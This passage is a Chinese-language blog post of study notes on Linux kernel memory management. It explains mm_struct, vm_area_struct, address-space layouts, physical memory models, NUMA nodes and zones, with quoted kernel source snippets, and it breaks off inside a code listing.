    <content type="html"><![CDATA[<p>整理破碎的知识体系……</p><p>根据这个大佬的公众号👉<a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg2MzU3Mjc3Ng==&action=getalbum&album_id=2559805446807928833&scene=173&from_msgid=2247488210&from_itemidx=1&count=3&nolastread=1#wechat_redirect">#聊聊Linux内核</a></p><span id="more"></span><p>内核版本5.19（buddy system前），5.4（buddy system即之后）</p><h1 id="虚拟内存管理"><a href="#虚拟内存管理" class="headerlink" title="虚拟内存管理"></a>虚拟内存管理</h1><p>先放一张结构图</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/mm_struct.png" class title="mm_struct"><ul><li>task_struct的mm指向mm_struct结构体</li><li>mm_struct的mmap成员指向vm_area_struct双向链表的头节点</li><li>vm_area_struct通过双向链表串联</li><li>vm_area_struct的vm_mm指向所属的mm_struct</li><li>mm_struct的mm_rb通过红黑树组织所有vm_area_struct</li><li>vm_area_struct的vm_rb指向所属红黑树</li></ul><p>新版本的vm_area_struct改用maple_tree组织了</p><h2 id="mm-struct结构体"><a href="#mm-struct结构体" class="headerlink" title="mm_struct结构体"></a>mm_struct结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">mmap</span>;</span><span class="hljs-comment">/* list of VMAs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_root</span> <span class="hljs-title">mm_rb</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> task_size;<span class="hljs-comment">/* size of task vm space */</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> total_vm;   <span class="hljs-comment">/* Total pages mapped */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> locked_vm;   <span class="hljs-comment">/* Pages that have PG_mlocked set */</span><br><span class="hljs-type">atomic64_t</span>    pinned_vm;   <span class="hljs-comment">/* Refcount permanently increased */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> data_vm;   <span class="hljs-comment">/* VM_WRITE &amp; ~VM_SHARED &amp; ~VM_STACK */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> exec_vm;   <span class="hljs-comment">/* VM_EXEC &amp; ~VM_WRITE &amp; ~VM_STACK */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_vm;   <span class="hljs-comment">/* VM_STACK */</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_code, end_code, start_data, end_data;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_brk, brk, start_stack;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg_start, arg_end, env_start, env_end;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>task_size：用户空间虚拟地址大小，等于TASK_SIZE宏，64位是0x00007ffffffff000</li><li>定义内存区域的成员：<ul><li>start_code，end_code：代码段</li><li>start_data，end_data：数据段</li><li>start_brk，brk：堆地址起始地址，结束地址</li><li>mmap_base：内存映射区起始地址</li><li>start_stack：栈起始位置（栈底）</li><li>arg_start，arg_end：参数列表</li><li>env_start，env_end：环境变量</li></ul></li><li>物理内存映射内容相关统计变量：<ul><li>total_vm：进程虚拟内存空间中映射物理内存页的总数</li><li>locked_vm：锁定不能换出的内存页总数</li><li>pinned_vm：既不能换出，也不能移动的内存页总数</li><li>data_vm：数据段中映射的内存页数目</li><li>exec_vm：代码段中存放可执行文件的内存页数目</li><li>stack_vm：栈中所映射的内存页数目</li></ul></li></ul><h2 id="vm-area-struct结构体"><a href="#vm-area-struct结构体" class="headerlink" title="vm_area_struct结构体"></a>vm_area_struct结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vm_start;<span class="hljs-comment">/* Our start address within vm_mm. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vm_end;<br>    <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vm_next</span>, *<span class="hljs-title">vm_prev</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_node</span> <span class="hljs-title">vm_rb</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">vm_mm</span>;</span><span class="hljs-comment">/* The address space we belong to. */</span><br><br><span class="hljs-type">pgprot_t</span> vm_page_prot;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vm_flags;<span class="hljs-comment">/* Flags, see mm.h. */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma</span> *<span class="hljs-title">anon_vma</span>;</span><span class="hljs-comment">/* Serialized by page_table_lock */</span><br><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> *<span class="hljs-title">vm_ops</span>;</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vm_pgoff;<span class="hljs-comment">/* Offset (within vm_file) in PAGE_SIZE</span><br><span class="hljs-comment">   units */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> * <span class="hljs-title">vm_file</span>;</span><span class="hljs-comment">/* File we map to (can be NULL). */</span><br><span class="hljs-type">void</span> * vm_private_data;<span class="hljs-comment">/* was vm_pte (shared mem) */</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><ul><li><p>vm_start，vm_end：虚拟地址范围（左闭右开）</p><ul><li>vm_page_prot：页级别访问控制</li><li>vm_flags：虚拟内存访问控制</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">vma-&gt;vm_page_prot = vm_get_page_prot(vma-&gt;vm_flags) <span class="hljs-comment">// 转换</span><br></code></pre></td></tr></table></figure></li><li><p>vm_file：关联被映射的文件</p></li><li><p>vm_pgoff：映射进虚拟内存中的文件内容，在文件中的偏移</p></li><li><p>anon_vma：匿名映射</p></li><li><p>vm_private_data：用于存储VMA中的私有数据</p></li><li><p>vm_ops：针对虚拟内存区域VMA的相关操作的函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> &#123;</span><br><span class="hljs-type">void</span> (*open)(<span class="hljs-keyword">struct</span> vm_area_struct * area);<br><span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> vm_area_struct * area);<br><span class="hljs-type">vm_fault_t</span> (*fault)(<span class="hljs-keyword">struct</span> vm_fault *vmf);<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>open：指定的虚拟内存区域被加入到进程虚拟内存空间中时调用</li><li>close：虚拟内存区域VMA从进程虚拟内存空间中被删除时调用</li><li>fault：发生缺页异常时调用（未分配物理页或被换出）</li><li>page_mkwrite：当一个只读的页面将要变为可写时调用</li></ul></li></ul><h2 id="虚拟内存空间布局"><a href="#虚拟内存空间布局" class="headerlink" title="虚拟内存空间布局"></a>虚拟内存空间布局</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>还是先放一张图</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/32%E4%BD%8D.png" class title="32位"><ul><li><p>前896M物理内存直接映射到3G—3G+896M</p><ul><li>前1M被系统启动占用（BIOS什么的）</li><li>后面是内核代码段，数据段，BSS段</li><li>进程相关的数据结构，内核栈也会存放在物理内存前896M的这段区域中</li></ul><p>X86 体系结构下，ISA总线的DMA（直接内存存取）控制器，只能对内存的前16M 进行寻址，所以直接映射区又分为DMA映射区和NORMAL映射区</p></li><li><p>剩下的物理内存动态映射到vmalloc动态映射区，使用vmalloc进行分配，分配的物理页是不连续的</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/vmalloc.png" class title="vmalloc"></li><li><p>永久映射区允许建立与物理高端内存（896M以上）的长期映射关系，比如内核通过 alloc_pages() 函数在物理内存的高端内存中申请获取到的物理内存页，这些物理内存页可以通过调用 kmap 映射到永久映射区中</p></li><li><p>固定映射区类似永久映射区，但映射的物理页是固定的，在编译期间就已经确定</p></li><li><p>临时映射区用于拷贝物理页时临时将物理内存页映射到虚拟内存</p></li></ul><h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><p>依然先放一张图</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/64%E4%BD%8D.png" class title="64位"><p>大部分在32位都有</p><ul><li>虚拟内存映射区用于存放page结构体</li><li>代码段用于映射内核代码</li></ul><h1 id="物理内存管理"><a href="#物理内存管理" class="headerlink" title="物理内存管理"></a>物理内存管理</h1><h2 id="物理内存模型"><a href="#物理内存模型" class="headerlink" title="物理内存模型"></a>物理内存模型</h2><h3 id="FLATMEM平坦内存模型"><a href="#FLATMEM平坦内存模型" class="headerlink" title="FLATMEM平坦内存模型"></a>FLATMEM平坦内存模型</h3><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/FLATMEM.png" class title="FLATMEM"><p>一个page全局数组mem_map管全部</p><p>pfn和page的转换</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CONFIG_FLATMEM)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __pfn_to_page(pfn)(mem_map + ((pfn) - ARCH_PFN_OFFSET))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __page_to_pfn(page)((unsigned long)((page) - mem_map) + \</span><br><span class="hljs-meta"> ARCH_PFN_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_DISCONTIGMEM)</span><br></code></pre></td></tr></table></figure><h3 id="DISCONTIGMEM非连续内存模型"><a href="#DISCONTIGMEM非连续内存模型" class="headerlink" title="DISCONTIGMEM非连续内存模型"></a>DISCONTIGMEM非连续内存模型</h3><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/DISCONTIGMEM.png" class title="DISCONTIGMEM"><p>pglist_data表示node</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_FLAT_NODE_MEM_MAP<span class="hljs-comment">/* means !SPARSEMEM */</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">node_mem_map</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span><br>&#125;<br></code></pre></td></tr></table></figure><p>node_mem_map数组管理page</p><p>pfn和page的转换多了一步</p><ul><li>arch_pfn_to_nid根据物理页的pfn定位到所在node</li><li>page_to_nid根据page定位到所在node</li></ul><p>之后一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_DISCONTIGMEM)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __pfn_to_page(pfn)\</span><br><span class="hljs-meta">(&#123;unsigned long __pfn = (pfn);\</span><br><span class="hljs-meta">unsigned long __nid = arch_pfn_to_nid(__pfn);  \</span><br><span class="hljs-meta">NODE_DATA(__nid)-&gt;node_mem_map + arch_local_page_offset(__pfn, __nid);\</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __page_to_pfn(pg)\</span><br><span class="hljs-meta">(&#123;const struct page *__pg = (pg);\</span><br><span class="hljs-meta">struct pglist_data *__pgdat = NODE_DATA(page_to_nid(__pg));\</span><br><span class="hljs-meta">(unsigned long)(__pg - __pgdat-&gt;node_mem_map) +\</span><br><span class="hljs-meta"> __pgdat-&gt;node_start_pfn;\</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure><h3 id="SPARSEMEM稀疏内存模型"><a href="#SPARSEMEM稀疏内存模型" class="headerlink" title="SPARSEMEM稀疏内存模型"></a>SPARSEMEM稀疏内存模型</h3><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/SPARSEMEM.png" class title="SPARSEMEM"><p>mem_section管理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_section</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> section_mem_map;<br>&#125;<br></code></pre></td></tr></table></figure><p>section_mem_map其实是个指针，指向管理的page数组</p><p>用一个全局数组管理所有section</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_section</span> **<span class="hljs-title">mem_section</span>;</span><br></code></pre></td></tr></table></figure><p>pfn和page的转换更复杂了</p><ul><li>如果有vmemmap直接使用vmemap（64位空间多随意挥霍( •̀ ω •́ )✧）</li><li>page_to_pfn先根据page定位到section，再通过section_mem_map定位到pfn</li><li>pfn_to_page先根据pfn定位到section，再通过pfn从section_mem_map指向的数组定位到page</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_SPARSEMEM_VMEMMAP)</span><br><br><span class="hljs-comment">/* memmap is virtually contiguous.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __pfn_to_page(pfn)(vmemmap + (pfn))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __page_to_pfn(page)(unsigned long)((page) - vmemmap)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_SPARSEMEM)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Note: section&#x27;s mem_map is encoded to reflect its start_pfn.</span><br><span class="hljs-comment"> * section[i].section_mem_map == mem_map&#x27;s address - start_pfn;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __page_to_pfn(pg)\</span><br><span class="hljs-meta">(&#123;const struct page *__pg = (pg);\</span><br><span class="hljs-meta">int __sec = page_to_section(__pg);\</span><br><span class="hljs-meta">(unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));\</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __pfn_to_page(pfn)\</span><br><span class="hljs-meta">(&#123;unsigned long __pfn = (pfn);\</span><br><span class="hljs-meta">struct mem_section *__sec = __pfn_to_section(__pfn);\</span><br><span class="hljs-meta">__section_mem_map_addr(__sec) + __pfn;\</span><br><span class="hljs-meta">&#125;)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_FLATMEM/DISCONTIGMEM/SPARSEMEM */</span></span><br></code></pre></td></tr></table></figure><h2 id="物理内存架构"><a href="#物理内存架构" class="headerlink" title="物理内存架构"></a>物理内存架构</h2><ul><li><p>UMA架构（一致性内存访问）</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/UMA.png" class title="UMA"></li><li><p>NUMA架构（非一致性内存访问）</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/NUMA.png" class title="NUMA"><p>访问本地内存节点很快，访问其他内存节点很慢</p></li></ul><p>NUMA的分配策略</p><ul><li>MPOL_BIND：必须在绑定的节点进行分配，内存不足则进行swap</li><li>MPOL_INTERLEAVE：本地节点和远程节点都可以进行分配</li><li>MPOL_PREFERRED：优先在指定节点分配内存，当指定节点内存不足时，选择离指定节点最近的节点分配内存</li><li>MPOL_LOCAL（默认）：优先在本地节点分配，当本地节点内存不足时，可以在远程节点分配内存</li></ul><h2 id="NUMA节点管理"><a href="#NUMA节点管理" class="headerlink" title="NUMA节点管理"></a>NUMA节点管理</h2><p>物理内存在内核中管理的层级关系为：Node→Zone→page</p><p>一个node表示一个NUMA节点</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/nodes.png" class title="nodes"><p>先放一张总体结构图</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/numanode.png" class title="numanode"><ul><li><p>使用一个pglist_data的全局数组node_data管理所有node</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span> *<span class="hljs-title">node_data</span>[<span class="hljs-title">MAX_NUMNODES</span>] __<span class="hljs-title">read_mostly</span>;</span><br>EXPORT_SYMBOL(node_data);<br></code></pre></td></tr></table></figure></li><li><p>NUMA节点描述结构体pglist_data</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> <span class="hljs-title">node_zones</span>[<span class="hljs-title">MAX_NR_ZONES</span>];</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zonelist</span> <span class="hljs-title">node_zonelists</span>[<span class="hljs-title">MAX_ZONELISTS</span>];</span><br><br><span class="hljs-type">int</span> nr_zones; <span class="hljs-comment">/* number of populated zones in this node */</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> node_start_pfn;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> node_present_pages; <span class="hljs-comment">/* total number of physical pages */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> node_spanned_pages; <span class="hljs-comment">/* total size of physical page</span><br><span class="hljs-comment">     range, including holes */</span><br><span class="hljs-type">int</span> node_id;<br><span class="hljs-type">wait_queue_head_t</span> kswapd_wait;<br><span class="hljs-type">wait_queue_head_t</span> pfmemalloc_wait;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">kswapd</span>;</span><span class="hljs-comment">/* Protected by</span><br><span class="hljs-comment">   mem_hotplug_begin/end() */</span><br><span class="hljs-type">int</span> kswapd_order;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_type</span> <span class="hljs-title">kswapd_highest_zoneidx</span>;</span><br><br><span class="hljs-type">int</span> kswapd_failures;<span class="hljs-comment">/* Number of &#x27;reclaimed == 0&#x27; runs */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPACTION</span><br><span class="hljs-type">int</span> kcompactd_max_order;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_type</span> <span class="hljs-title">kcompactd_highest_zoneidx</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> kcompactd_wait;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">kcompactd</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125; <span class="hljs-type">pg_data_t</span>;<br></code></pre></td></tr></table></figure><ul><li><p>node_id：NUMA节点id</p></li><li><p>node_mem_map：page类型数组，包含NUMA中的所有物理页</p></li><li><p>node_start_pfn：指向NUMA节点内第一个物理页的PFN（PFN全局唯一）</p></li><li><p>node_present_pages：可用的物理页面数量（不包含空洞）</p></li><li><p>node_spanned_pages：所有物理页面数量（包含空洞）</p></li><li><p>nr_zones：用于统计NUMA节点内包含的物理内存区域个数</p><p><strong>注：只有第一个NUMA节点可以包含所有种类的zone，比如DMA必须从物理内存起点开始</strong></p></li><li><p>node_zones：zone数组，包含NUMA节点中的所有物理内存区域</p></li><li><p>node_zonelists：zonelist数组，包含了备用NUMA节点和这些备用节点中的物理内存区域（备用节点按访问距离远近排列）</p></li><li><p>kswapd：一个用于回收不经常使用的页面的进程</p></li><li><p>kcompactd：一个用于内存的规整避免内存碎片的进程</p></li></ul></li><li><p>NUMA节点物理内存区域的划分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_type</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA</span><br>ZONE_DMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA32</span><br>ZONE_DMA32,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>ZONE_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HIGHMEM</span><br>ZONE_HIGHMEM,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>ZONE_MOVABLE,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DEVICE</span><br>ZONE_DEVICE,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>__MAX_NR_ZONES<br><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>ZONE_DMA：用于那些无法对全部物理内存进行寻址的硬件设备，进行 DMA 时的内存分配（如ISA只能寻址前16M）</li><li>ZONE_DMA32：提供给32位设备（只能寻址4G物理内存）执行DMA操作时使用的（只在64位系统中起作用）</li><li>ZONE_NORMAL：直接映射的896M剩下的部分</li><li>ZONE_HIGHMEM：剩下的高端内存</li><li>ZONE_DEVICE：为支持热插拔设备而分配的非易失性内存（也可用于内核崩溃时保存相关的调试信息）</li><li>ZONE_MOVABLE：内核定义的一个虚拟内存区域，该zone中的物理页可以来自于上边介绍的几种真实的物理区域，页都是可以迁移的，主要是为了防止内存碎片和支持内存的热插拔</li></ul></li><li><p>node_states：NUMA节点不止一个的时候使用，位图，用于维护各个NUMA节点的状态信息（只有一个NUMA节点时没有）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> DECLARE_BITMAP(bits, MAX_NUMNODES); &#125; <span class="hljs-type">nodemask_t</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">nodemask_t</span> _unused_nodemask_arg_;<br></code></pre></td></tr></table></figure><p>节点状态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">node_states</span> &#123;</span><br>N_POSSIBLE,<span class="hljs-comment">/* The node could become online at some point */</span><br>N_ONLINE,<span class="hljs-comment">/* The node is online */</span><br>N_NORMAL_MEMORY,<span class="hljs-comment">/* The node has regular memory */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HIGHMEM</span><br>N_HIGH_MEMORY,<span class="hljs-comment">/* The node has regular or high memory */</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>N_HIGH_MEMORY = N_NORMAL_MEMORY,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>N_MEMORY,<span class="hljs-comment">/* The node has memory(regular, high, movable) */</span><br>N_CPU,<span class="hljs-comment">/* The node has one or more cpus */</span><br>N_GENERIC_INITIATOR,<span class="hljs-comment">/* The node has one or more Generic Initiators */</span><br>NR_NODE_STATES<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>N_POSSIBLE：节点随时会上线</li><li>N_ONLINE：节点已上线</li><li>N_NORMAL_MEMORY：节点没有高端内存，只有ZONE_NORMAL</li><li>N_HIGH_MEMORY：节点有ZONE_NORMAL或者有ZONE_HIGHMEM</li><li>N_MEMORY：节点有ZONE_NORMAL，ZONE_HIGHMEM，ZONE_MOVABLE</li><li>N_CPU：表示节点包含一个或多个 CPU</li></ul></li></ul><h2 id="NUMA节点中的物理内存管理"><a href="#NUMA节点中的物理内存管理" class="headerlink" title="NUMA节点中的物理内存管理"></a>NUMA节点中的物理内存管理</h2><p>zone和node的关系</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/zone.png" class title="zone"><p>zone结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 